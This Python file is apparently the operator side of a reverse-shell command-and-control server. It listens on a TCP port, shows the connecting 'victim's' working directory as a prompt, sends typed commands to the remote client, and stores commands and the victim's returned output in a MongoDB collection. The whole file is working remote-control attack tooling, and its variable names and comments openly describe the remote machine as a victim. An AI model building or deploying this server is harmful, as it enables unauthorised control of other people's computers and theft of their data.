#!/usr/bin/env python3
import socket
import threading
import pymongo
import time
import signal
from sys import exit

errors_might_happen = (pymongo.errors.ServerSelectionTimeoutError, socket.error, Exception)
signal.signal(signal.SIGINT, signal.SIG_DFL)


class ServerTcp:

    def __init__(self, ip_server=socket.gethostname(), port=60555, db_link='mongodb://localhost:27017/',
                 db_name='my_ref_db', collection_name='data_got'):
        try:
            self.db_Client = pymongo.MongoClient(db_link)
            self.mydb = self.db_Client[db_name]
            self.mycol = self.mydb[collection_name]

            self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

            self.s.bind((ip_server, port))

        except errors_might_happen as e:
            self.print_errors(e, before_s=True)
            return

        self.s.listen(5)
        print("Server is running")
        self.need_enter_msg = False
        self.start_conn()

    def test_connection(self):
        while self.connection:
            time.sleep(2)
            try:
                self.client_socket.send("CHECKING CONNECTION".encode())
            except errors_might_happen as e:
                self.print_errors(e)

    def print_errors(self, e, before_s=False):  # print Errors & make sure class exit.
        if before_s:
            print(f"\n# {e}")
            return
        if self.connection:  # to make sure msgs will not be repeated.
            self.connection = False
            print(f"\n# {e}")
            if self.need_enter_msg:
                print('# Connection Closed - press Enter To restart Server')

    def start_conn(self):
        """Function that waits for client connection."""

        print("\n[ Waiting For Client ]\n")
        self.client_socket, self.address = self.s.accept()
        print("client address : ", self.address)

        self.connection = True
        self.test_conn = threading.Thread(target=self.test_connection)
        self.test_conn.daemon = True
        self.test_conn.start()

        self.connection_open()

    def connection_open(self):
        """Interacting with the connection."""
        get_victim_pwd, swap = True, ''

        while self.connection:
            if get_victim_pwd:
                try:
                    get_victim_pwd = self.client_socket.recv(1024).decode()
                except errors_might_happen as e:
                    self.print_errors(e)
                    break
                swap = get_victim_pwd
            else:
                get_victim_pwd = swap

            while self.connection:
                self.need_enter_msg = True
                msg = input(f"{get_victim_pwd} > ").strip()
                if msg:
                    self.need_enter_msg = False
                    break
            if msg in ['exit', 'get_op', 'get_last']:
                get_victim_pwd = False
            if msg == 'exit':  # Close the server
                exit(0)
            elif msg == "get_op":  # show the collection data.
                for i in self.mycol.find():
                    print(i['data'])
            elif msg == 'get_last':  # get last return of victim.
                try:
                    print(self.mycol.find_one({'sender': 'client'}, sort=[('_id', pymongo.DESCENDING)])['data'])
                except TypeError:
                    print("### No Client Data in DB .. yet. ##")
            else:
                get_victim_pwd = True
                try:
                    self.client_socket.send(msg.encode())
                    self.mycol.insert_one({"data": msg, 'sender': 'SERVER'})

                except errors_might_happen as e:
                    self.print_errors(e)


while True:
    ServerTcp(port=50000)
    print('-' * 20 + 'Restarting Server' + '-' * 20)
    time.sleep(2)
